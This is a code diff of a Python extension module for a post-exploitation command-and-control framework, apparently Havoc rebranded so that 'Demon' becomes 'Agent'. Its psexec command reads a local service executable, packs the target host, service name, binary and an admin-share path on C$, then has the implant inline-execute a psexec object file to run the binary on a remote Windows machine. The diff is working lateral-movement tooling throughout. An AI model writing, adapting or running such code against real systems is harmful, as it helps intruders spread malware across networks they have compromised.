@@ -1,9 +1,9 @@
-from havoc import Demon, RegisterCommand, RegisterModule
+from vaelix_host import Agent, RegisterCommand, RegisterModule
 from os.path import exists
 
-def psexec( demonID, *param ):
+def psexec( agentID, *param ):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer : Packer = Packer()
 
     Host      : str   = ""
@@ -11,14 +11,14 @@ def psexec( demonID, *param ):
     SvcPath   : str   = ""
     SvcBinary : bytes = b''
 
-    demon = Demon( demonID )
+    agent = Agent( agentID )
 
     if len(param) < 3:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough arguments" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough arguments" )
         return False
 
     if len(param) > 3:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many arguments" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Too many arguments" )
         return False
 
     Host    = param[ 0 ]
@@ -26,22 +26,22 @@ def psexec( demonID, *param ):
     SvcPath = param[ 2 ]
 
     if exists( SvcPath ) is False:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Service executable not found: {SvcPath}" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Service executable not found: {SvcPath}" )
         return False
     else:
         SvcBinary = open( SvcPath, 'rb' ).read()
         if len(SvcBinary) == 0:
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, "Specified service executable is empty" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, "Specified service executable is empty" )
             return False
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute {SvcPath} on {Host} using psexec" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute {SvcPath} on {Host} using psexec" )
 
     packer.addstr( Host )
     packer.addstr( SvcName )
     packer.addstr( SvcBinary )
     packer.addstr( "\\\\" + Host + "\\C$\\Windows\\" + SvcName + ".exe" )
 
-    demon.InlineExecute( TaskID, "go", f"psexec.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", f"psexec.{agent.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
